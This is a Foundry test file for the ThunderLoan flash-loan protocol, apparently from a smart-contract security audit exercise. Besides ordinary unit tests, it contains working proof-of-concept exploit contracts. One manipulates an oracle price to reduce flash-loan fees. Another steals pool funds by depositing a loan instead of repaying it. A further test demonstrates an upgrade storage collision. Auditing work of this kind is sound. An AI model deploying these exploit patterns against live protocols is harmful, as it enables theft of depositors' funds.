// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {BuffMockPoolFactory} from "../mocks/BuffMockPoolFactory.sol";
import {BuffMockTSwap} from "../mocks/BuffMockTSwap.sol" ;
import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol" ;
import {ERC20Mock} from "../mocks/ERC20Mock.sol" ;
import {ThunderLoanUpgraded} from '../../src/upgradedProtocol/ThunderLoanUpgraded.sol';
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    function testRedeemAfterLoan() external setAllowedToken hasDeposits {
 uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

uint256 amountToRedeem = type(uint256).max ;
vm.startPrank(liquidityProvider) ;
thunderLoan.redeem(tokenA , amountToRedeem) ;
    }

    function testPriceOracleManipulation() external{
        thunderLoan = new ThunderLoan() ;
    ERC20Mock newTokenA = new ERC20Mock();
       proxy = new ERC1967Proxy(address(thunderLoan) , "");
       BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth)) ;
       address tswapPool = pf.createPool(address(tokenA)) ;
       thunderLoan = ThunderLoan(address(proxy)) ;
       thunderLoan.initialize(address(pf)) ;

       vm.startPrank(liquidityProvider) ;
       tokenA.mint(liquidityProvider , 100e18) ;
       tokenA.approve(address(tswapPool) , 100e18) ;
       weth.mint(liquidityProvider , 100e18) ;
       weth.approve(address(tswapPool) , 100e18) ;
       BuffMockTSwap(tswapPool).deposit(100e18,100e18,100e18,block.timestamp) ;
vm.stopPrank();

vm.prank(thunderLoan.owner()) ;
thunderLoan.setAllowedToken(tokenA , true) ;


vm.startPrank(liquidityProvider) ;
tokenA.mint(liquidityProvider , 1000e18);
tokenA.approve(address(thunderLoan) , 1000e18);
thunderLoan.deposit(tokenA , 100e18) ;
vm.stopPrank() ;

uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA , 100e18) ;
console2.log("Normal Fee Cost Is : ", normalFeeCost);
// 0.296147410319118389

uint256 amountToBorrow = 50e18 ;
MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(address(tswapPool),address(thunderLoan),address(thunderLoan.getAssetFromToken(tokenA))) ;

vm.startPrank(user);
tokenA.mint(address(flr) , 100e18) ;
thunderLoan.flashloan(address(flr) , tokenA, amountToBorrow,"") ;
vm.stopPrank();

uint256 attackedFee = flr.fee1() + flr.fee2() ;
console2.log("attackedFee : ", attackedFee) ;
//0.214167600932190305
assert(attackedFee < normalFeeCost) ;
 }

 function testUseDepositInsteadOfRepayToStealFunds() external setAllowedToken hasDeposits {
 vm.startPrank(user) ;
 uint256 amountToBorrow = 50e18 ;
 uint256 fee = thunderLoan.getCalculatedFee(tokenA , amountToBorrow) ;
DepositOverRepay dor = new DepositOverRepay(address(thunderLoan)) ;
tokenA.mint(address(dor),fee) ;
thunderLoan.flashloan(address(dor) , tokenA , amountToBorrow , "") ;
dor.redeemMoney() ;
vm.stopPrank() ;

assert(tokenA.balanceOf(address(dor)) > 50e18+fee) ;
 }

function testUpgradeBreaks() external {
    uint256 feeBeforeUpgrade = thunderLoan.getFee() ;

    vm.startPrank(thunderLoan.owner()) ;
    ThunderLoanUpgraded upgraded= new ThunderLoanUpgraded()  ;
    thunderLoan.upgradeToAndCall(address(upgraded) , "");
    uint256 feeAfterUpgrade = thunderLoan.getFee() ;
    vm.stopPrank() ;

    console2.log("Fee Before :" , feeBeforeUpgrade) ;
    console2.log("Fee After :" , feeAfterUpgrade) ;
 
 assert(feeBeforeUpgrade != feeAfterUpgrade) ;
}   
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
  ThunderLoan thunderLoan ;
  address repayAddress ;
  BuffMockTSwap tswapPool ;
bool attacked ;
uint256 public fee1 ; 
uint256 public fee2 ;

    constructor(address _tswappool , address _thunderLoan, address _repayAddress){
tswapPool = BuffMockTSwap(_tswappool);
thunderLoan = ThunderLoan(_thunderLoan);
repayAddress = _repayAddress ;
    }

     function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    )
        external
        returns (bool){
if(!attacked){
fee1 = fee ;
attacked = true ;

uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18 , 100e18, 100e18) ;
IERC20(token).approve(address(tswapPool) , 50e18) ;
tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought , block.timestamp) ;

thunderLoan.flashloan(address(this) , IERC20(token), amount , "");

// IERC20(token).approve(address(thunderLoan), amount+fee);
// thunderLoan.repay(IERC20(token) , amount+fee);

IERC20(token).transfer(address(repayAddress) , amount+fee) ;

}else{

fee2 = fee ;

// IERC20(token).approve(address(thunderLoan), amount+fee);
// thunderLoan.repay(IERC20(token) , amount+fee);
IERC20(token).transfer(address(repayAddress) , amount+fee) ;

}
return true ; 
        }
}

contract DepositOverRepay is IFlashLoanReceiver {
  ThunderLoan thunderLoan ;
  AssetToken assetToken ;
IERC20 s_token ;

    constructor(address _thunderLoan){
thunderLoan = ThunderLoan(_thunderLoan);
    }

     function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    )
        external
        returns (bool){
            s_token =  IERC20(token) ;
            assetToken = thunderLoan.getAssetFromToken(IERC20(token)) ;
            IERC20(token).approve(address(thunderLoan) , amount+fee) ;
            thunderLoan.deposit(IERC20(token) , amount+fee) ;

return true ;
}

function redeemMoney() external {
uint256 amount = assetToken.balanceOf(address(this)) ;
thunderLoan.redeem(s_token , amount) ;
}

}

